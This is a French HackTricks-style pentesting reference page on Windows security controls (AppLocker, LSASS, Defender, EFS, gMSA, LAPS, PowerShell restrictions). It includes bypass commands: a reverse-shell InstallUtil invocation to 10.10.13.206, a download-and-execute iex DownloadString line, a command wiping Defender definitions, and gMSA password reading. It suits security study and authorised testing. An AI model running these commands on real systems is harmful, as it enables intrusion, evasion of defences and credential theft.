# Contrôles de sécurité Windows

{{#include ../banners/hacktricks-training.md}}

## Stratégie AppLocker

Une liste blanche d’applications est une liste de logiciels ou d’exécutables approuvés, autorisés à être présents et exécutés sur un système. L’objectif est de protéger l’environnement contre les malwares nuisibles et les logiciels non approuvés qui ne répondent pas aux besoins spécifiques d’une organisation.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) est la **solution de liste blanche d’applications** de Microsoft et permet aux administrateurs système de contrôler **quelles applications et quels fichiers les utilisateurs peuvent exécuter**. Elle fournit un **contrôle granulaire** des exécutables, des scripts, des fichiers Windows Installer, des DLL, des applications empaquetées et des installateurs d’applications empaquetés.\
Il est courant que les organisations **bloquent cmd.exe et PowerShell.exe** ainsi que l’accès en écriture à certains répertoires, **mais tout cela peut être contourné**.

### Vérification

Vérifier quels fichiers/extensions sont sur liste noire ou sur liste blanche :
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Ce chemin de registre contient les configurations et les stratégies appliquées par AppLocker, offrant un moyen d’examiner l’ensemble actuel des règles appliquées sur le système :

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Dossiers accessibles en écriture** utiles pour contourner la stratégie AppLocker : si AppLocker autorise l’exécution de n’importe quel élément dans `C:\Windows\System32` ou `C:\Windows`, vous pouvez utiliser des **dossiers accessibles en écriture** pour **contourner cette protection**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Les binaires [**« LOLBAS »**](https://lolbas-project.github.io/) **généralement considérés comme fiables** peuvent également être utiles pour contourner AppLocker.
- Des règles **mal écrites peuvent également être contournées**.
- Par exemple, avec **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, vous pouvez créer un **dossier appelé `allowed`** n’importe où, et il sera autorisé.
- Les organisations se concentrent également souvent sur le **blocage de l’exécutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, mais oublient les **autres [**emplacements des exécutables PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)**, tels que `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ou `PowerShell_ISE.exe`.
- **L’application des règles aux DLL est très rarement activée**, en raison de la charge supplémentaire qu’elle peut imposer à un système et de la quantité de tests nécessaires pour s’assurer que rien ne sera affecté. Ainsi, l’utilisation de **DLL comme backdoors** aidera à contourner AppLocker.
- Vous pouvez utiliser [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) pour **exécuter du code Powershell** dans n’importe quel processus et contourner AppLocker. Pour plus d’informations, consultez : [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Stockage des identifiants

### Security Accounts Manager (SAM)

Les identifiants locaux sont présents dans ce fichier, les mots de passe sont hachés.

### Local Security Authority (LSA) - LSASS

Les **identifiants** (hachés) sont **enregistrés dans la mémoire** de ce sous-système pour des raisons de Single Sign-On.\
**LSA** administre la **stratégie de sécurité** locale (stratégie de mots de passe, permissions des utilisateurs...), l’**authentification**, les **jetons d’accès**...\
LSA vérifie les **identifiants** fournis dans le fichier **SAM** (pour une connexion locale) et communique avec le **contrôleur de domaine** pour authentifier un utilisateur du domaine.

Les **identifiants** sont **enregistrés dans le processus LSASS** : tickets Kerberos, hashes NT et LM, mots de passe facilement déchiffrables.

### Secrets LSA

LSA peut enregistrer certains identifiants sur le disque :

- Mot de passe du compte machine d’Active Directory (contrôleur de domaine inaccessible).
- Mots de passe des comptes des services Windows
- Mots de passe des tâches planifiées
- Plus encore (mot de passe des applications IIS...)

### NTDS.dit

Il s’agit de la base de données d’Active Directory. Elle est uniquement présente sur les contrôleurs de domaine.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) est un antivirus disponible dans Windows 10 et Windows 11, ainsi que dans les versions de Windows Server. Il **bloque** les outils de pentesting courants tels que **`WinPEAS`**. Cependant, il existe des moyens de **contourner ces protections**.

### Vérification

Pour vérifier l’**état** de **Defender**, vous pouvez exécuter la cmdlet PS **`Get-MpComputerStatus`** (vérifiez la valeur de **`RealTimeProtectionEnabled`** pour savoir si elle est active) :

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Pour l’énumérer, vous pouvez également exécuter :
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS sécurise les fichiers par chiffrement, en utilisant une **clé symétrique** appelée **File Encryption Key (FEK)**. Cette clé est chiffrée avec la **clé publique** de l'utilisateur et stockée dans l'**alternative data stream** $EFS du fichier chiffré. Lorsqu'un déchiffrement est nécessaire, la **clé privée** correspondante du certificat numérique de l'utilisateur est utilisée pour déchiffrer la FEK depuis le flux $EFS. Plus de détails sont disponibles [ici](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Les scénarios de déchiffrement sans intervention de l'utilisateur** incluent :

- Lorsque des fichiers ou dossiers sont déplacés vers un système de fichiers non-EFS, comme [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), ils sont automatiquement déchiffrés.
- Les fichiers chiffrés envoyés sur le réseau via le protocole SMB/CIFS sont déchiffrés avant leur transmission.

Cette méthode de chiffrement permet un **accès transparent** aux fichiers chiffrés pour leur propriétaire. Cependant, modifier simplement le mot de passe du propriétaire et se connecter ne permettra pas le déchiffrement.

**Points clés** :

- EFS utilise une FEK symétrique, chiffrée avec la clé publique de l'utilisateur.
- Le déchiffrement utilise la clé privée de l'utilisateur pour accéder à la FEK.
- Le déchiffrement automatique se produit dans certaines conditions, comme la copie vers FAT32 ou la transmission réseau.
- Les fichiers chiffrés sont accessibles au propriétaire sans étapes supplémentaires.

### Vérifier les informations EFS

Vérifiez si un **utilisateur** a **utilisé** ce **service** en vérifiant si ce chemin existe :`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Vérifiez **qui** a **accès** au fichier en utilisant cipher /c \<file>\
Vous pouvez également utiliser `cipher /e` et `cipher /d` dans un dossier pour **chiffrer** et **déchiffrer** tous les fichiers

### Déchiffrer des fichiers EFS

#### Être Authority System

Cette méthode nécessite que l'**utilisateur victime** **exécute** un **processus** sur l'hôte. Si c'est le cas, en utilisant une session `meterpreter`, vous pouvez usurper le token du processus de l'utilisateur (`impersonate_token` depuis `incognito`). Vous pouvez également simplement effectuer une `migrate` vers le processus de l'utilisateur.

#### Connaître le mot de passe de l'utilisateur

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft a développé les **Group Managed Service Accounts (gMSA)** pour simplifier la gestion des comptes de service dans les infrastructures IT. Contrairement aux comptes de service traditionnels qui ont souvent le paramètre "**Password never expire**" activé, les gMSA offrent une solution plus sécurisée et plus facile à gérer :

- **Gestion automatique des mots de passe** : les gMSA utilisent un mot de passe complexe de 240 caractères qui change automatiquement selon la stratégie du domaine ou de l'ordinateur. Ce processus est géré par le Key Distribution Service (KDC) de Microsoft, ce qui élimine le besoin de mises à jour manuelles du mot de passe.
- **Sécurité renforcée** : ces comptes ne sont pas concernés par les verrouillages et ne peuvent pas être utilisés pour des connexions interactives, ce qui renforce leur sécurité.
- **Prise en charge de plusieurs hôtes** : les gMSA peuvent être partagés entre plusieurs hôtes, ce qui les rend idéaux pour les services exécutés sur plusieurs serveurs.
- **Prise en charge des tâches planifiées** : contrairement aux managed service accounts, les gMSA permettent l'exécution de tâches planifiées.
- **Gestion simplifiée des SPN** : le système met automatiquement à jour le Service Principal Name (SPN) lorsque les informations sAMaccount ou le nom DNS de l'ordinateur sont modifiés, ce qui simplifie la gestion des SPN.

Les mots de passe des gMSA sont stockés dans la propriété LDAP _**msDS-ManagedPassword**_ et sont automatiquement réinitialisés tous les 30 jours par les Domain Controllers (DCs). Ce mot de passe, un blob de données chiffré connu sous le nom de [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), peut uniquement être récupéré par les administrateurs autorisés et les serveurs sur lesquels les gMSA sont installés, garantissant ainsi un environnement sécurisé. Pour accéder à ces informations, une connexion sécurisée telle que LDAPS est requise, ou la connexion doit être authentifiée avec 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Vous pouvez lire ce mot de passe avec [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Trouvez plus d'informations dans cet article**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Consultez également cette [page web](https://cube0x0.github.io/Relaying-for-gMSA/) expliquant comment effectuer une **NTLM relay attack** pour **lire** le **mot de passe** d'un **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

Le **Local Administrator Password Solution (LAPS)**, disponible au téléchargement depuis [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), permet de gérer les mots de passe des comptes Administrator locaux. Ces mots de passe, qui sont **randomisés**, uniques et **régulièrement modifiés**, sont stockés de manière centralisée dans Active Directory. L'accès à ces mots de passe est limité par des ACL aux utilisateurs autorisés. Des permissions suffisantes permettent de lire les mots de passe des administrateurs locaux.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

Le [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) de PowerShell **bloque de nombreuses fonctionnalités** nécessaires à une utilisation efficace de PowerShell, notamment les objets COM, en autorisant uniquement les types .NET approuvés, les workflows basés sur XAML, les classes PowerShell, etc.

### **Vérification**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Contournement
```bash
#Easy bypass
Powershell -version 2
```
Dans les versions actuelles de Windows, ce Bypass ne fonctionnera pas, mais vous pouvez utiliser[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Pour le compiler, vous devrez peut-être** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> ajouter `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` et **modifier le projet pour utiliser .Net4.5**.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Vous pouvez utiliser [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) pour **exécuter du code Powershell** dans n’importe quel processus et contourner le mode contraint. Pour plus d’informations, consultez : [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Stratégie d’exécution PS

Par défaut, elle est définie sur **restricted.** Principales méthodes pour contourner cette stratégie :<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Vous trouverez davantage d'informations [ici](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Interface des fournisseurs de support de sécurité (SSPI)

Il s'agit de l'API qui peut être utilisée pour authentifier les utilisateurs.

La SSPI est chargée de trouver le protocole adéquat pour deux machines qui souhaitent communiquer. La méthode privilégiée est Kerberos. La SSPI négocie ensuite le protocole d'authentification à utiliser. Ces protocoles d'authentification sont appelés Security Support Provider (SSP), se trouvent sur chaque machine Windows sous la forme d'une DLL, et les deux machines doivent prendre en charge le même protocole pour pouvoir communiquer.

### Principaux SSP

- **Kerberos** : le protocole privilégié
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** et **NTLMv2** : pour des raisons de compatibilité
- %windir%\Windows\System32\msv1_0.dll
- **Digest** : serveurs web et LDAP, mot de passe sous la forme d'un hash MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel** : SSL et TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate** : utilisé pour négocier le protocole à utiliser (Kerberos ou NTLM, Kerberos étant le protocole par défaut)
- %windir%\Windows\System32\lsasrv.dll

#### La négociation peut proposer plusieurs méthodes ou une seule.

## UAC - Contrôle de compte d'utilisateur

[Le contrôle de compte d'utilisateur (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) est une fonctionnalité qui active une **demande de consentement pour les activités nécessitant une élévation de privilèges**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Références

- [1] [Bypassing Applocker and Powershell contstrained language mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [2] [howto ~ déchiffrer des fichiers EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying for gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

{{#include ../banners/hacktricks-training.md}}
